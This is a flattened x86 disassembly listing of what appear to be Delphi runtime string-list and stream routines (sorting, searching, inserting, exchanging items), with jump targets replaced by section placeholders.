push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4059b4
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a87
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_414a90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414884
xor eax eax
push ebp
push sub_414b46
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b4d
mov eax [ ebp - 0x4 ]
call sub_414940
retn
sub_414b84
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414bc9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404374
call sub_4085f0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bd0
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_414bd8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414ce3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f4c
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403fa4
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cea
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ed8
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404174
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404174
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404174
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404174
mov ebx eax
test ebx ebx
je r-xdata
sub_414d00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414d78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d7f
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414d8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414e4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4043d4
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_4153ec
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40409c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c004
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e56
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
sub_414e60
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414ec4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415f28
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414f0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f13
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
sub_414f18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414fb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414884
xor eax eax
push ebp
push sub_414f98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415a74
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403fa4
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f9f
mov eax [ ebp - 0x4 ]
call sub_414940
retn
sub_414fc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415065
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41506c
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov eax [ ebp - 0x4 ]
call sub_414884
xor eax eax
push ebp
push sub_415048
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414940
retn
sub_415074
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4150ac
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415150
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417c64
mov eax [ ebp - 0x4 ]
call sub_414884
xor eax eax
push ebp
push sub_41512b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_416d00
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418904
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415132
mov eax [ ebp - 0x4 ]
call sub_414940
retn
sub_41515c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415f28
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4151a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4151ae
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
sub_4151b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415201
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404174
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415cd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415208
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_415214
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405508
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415248
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41528b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040ac
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415292
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_415298
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41534c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414884
xor edx edx
push ebp
push sub_41532f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415336
mov eax [ ebp - 0x4 ]
call sub_414940
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fa4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41535c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4153d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4194b0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_4194b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153d9
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_419558
inc esi
dec ebx
jne r-xdata
sub_415404
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_415420
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146bc
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404930
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_415488
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414a38
jmp r-xdata
sub_415524
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404930
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415564
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414a38
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a1c
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_4155d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414a38
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414a38
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41562c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41562c
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_415650
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_4156c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414a38
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f08
pop edi
pop esi
pop ebx
retn
sub_415704
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414a38
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41572c
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_415760
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414d00
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4157ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414a38
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414a38
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415800
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41572c
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f08
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028c8
sub_415878
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414a38
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414a38
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4158d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414a38
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415914
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41562c
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415914
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4159c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415a20
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415914
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415a74
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415aa8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415b0c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
